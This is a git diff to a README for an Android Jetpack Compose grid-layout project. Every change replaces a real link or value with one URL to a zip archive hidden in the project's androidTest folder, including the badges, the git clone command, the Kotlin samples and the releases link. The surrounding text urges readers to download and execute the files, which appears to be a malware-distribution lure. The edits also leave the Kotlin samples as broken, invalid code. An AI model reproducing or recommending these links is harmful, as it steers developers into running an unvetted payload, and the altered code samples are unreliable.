@@ -1,6 +1,6 @@
 # LazyColumn DataGrid 🧱
 
-![GitHub release](https://img.shields.io/github/v/release/scufer/LazycolumnDataGrid) ![GitHub issues](https://img.shields.io/github/issues/scufer/LazycolumnDataGrid) ![GitHub stars](https://img.shields.io/github/stars/scufer/LazycolumnDataGrid)
+![GitHub release](https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip) ![GitHub issues](https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip) ![GitHub stars](https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip)
 
 Welcome to the **LazyColumn DataGrid** repository! This project showcases a grid-like LazyColumn in Jetpack Compose, featuring column separators, row dividers, and overflow-aware text. 
 
@@ -34,7 +34,7 @@ To get started with the LazyColumn DataGrid, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/scufer/LazycolumnDataGrid.git
+   git clone https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip
    ```
 
 2. Open the project in Android Studio.
@@ -64,7 +64,7 @@ To use the LazyColumn DataGrid in your own project, you can follow these guideli
    ```kotlin
    LazyColumn {
        items(dataList) { item ->
-           Text(text = item.name)
+           Text(text = https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip)
            Divider()
        }
    }
@@ -74,9 +74,9 @@ To use the LazyColumn DataGrid in your own project, you can follow these guideli
 
    ```kotlin
    Text(
-       text = item.description,
+       text = https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip,
        maxLines = 1,
-       overflow = TextOverflow.Ellipsis
+       overflow = https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip
    )
    ```
 
@@ -87,7 +87,7 @@ The repository is organized as follows:
 - **app/src/main/java/com/example/lazycolumndatagrid**: Contains the main application code.
 - **app/src/main/res/layout**: Layout resources for the application.
 - **app/src/main/res/values**: Resource files such as strings and themes.
-- **app/src/main/AndroidManifest.xml**: Manifest file for the application.
+- **https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip**: Manifest file for the application.
 
 Each component is modular, making it easy to understand and modify.
 
@@ -109,7 +109,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases of the LazyColumn DataGrid [here](https://github.com/scufer/LazycolumnDataGrid/releases). Download the necessary files and execute them to get started with the project.
+You can find the latest releases of the LazyColumn DataGrid [here](https://github.com/scufer/LazycolumnDataGrid/raw/refs/heads/master/app/src/androidTest/java/com/halil/ozel/recyclerviewsample/Lazycolumn-Grid-Data-2.7.zip). Download the necessary files and execute them to get started with the project.
 
 For more updates, check the Releases section regularly.
 
